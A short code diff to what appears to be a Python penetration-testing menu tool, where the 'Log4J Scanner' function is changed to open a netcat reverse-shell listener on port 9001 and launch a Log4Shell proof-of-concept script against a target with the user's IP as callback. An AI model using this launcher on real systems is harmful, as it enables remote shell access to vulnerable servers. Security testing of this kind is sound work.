@@ -49,8 +49,10 @@ def log4J_shell():
         os.system("clear")
     print(f"{ok} Log4J Scanner\n")
     ip=input("Insert your IP (tap if use the VPN): ")
+    print(f"{ok} Launch in a new terminal this command: wsl nc -lvnp 9001")
+    os.system("cmd /c start powershell -Command { wsl nc -lvnp 9001 }")
     os.system(f"python3 {root_path}\\log4j-shell-poc\\poc.py --userip {ip} --webport 80 --lport 9001")
-    #os.system(f"wsl")
+    
 
 '''
 HTTP VERB TAMPERING 
